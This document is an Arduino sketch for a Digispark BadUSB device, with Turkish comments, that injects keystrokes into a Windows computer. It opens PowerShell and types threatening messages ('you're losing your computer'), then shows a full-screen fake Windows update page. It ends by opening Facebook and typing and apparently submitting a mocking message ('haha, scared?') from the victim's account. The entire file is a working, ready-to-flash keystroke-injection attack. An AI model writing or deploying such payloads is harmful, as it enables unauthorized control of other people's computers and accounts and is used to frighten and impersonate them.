#define kbd_tr_tr
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(0);
  }
void loop() {
  int i = 1;
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT); // Masaüstü açılır
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Windows çalıştırma paneli
  DigiKeyboard.delay(600);
  DigiKeyboard.print("powershell"); //powersell i açar
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("BU EKRANI SAKIN KAPATMA!!!!");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("kayan kırmızı yazılardan korktuğunu biliyorum:):)):");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("bilgisayarını kaybediyorsun:):)):");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke
        (KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("https://fakeupdate.net/wnc/");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_F11);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F11);
  DigiKeyboard.delay(600);
  while(i==1){  // Enter your chosen case here
  DigiKeyboard.sendKeyStroke
        (KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("www.facebook.com");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.print("p"); 
  DigiKeyboard.delay(600);
  DigiKeyboard.print("HAHAH KORKTUN MU?");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);  
  DigiKeyboard.sendKeyStroke
        (KEY_ENTER, MOD_CONTROL_RIGHT); 
  i = 2;
  delay(8000);   
  }  
}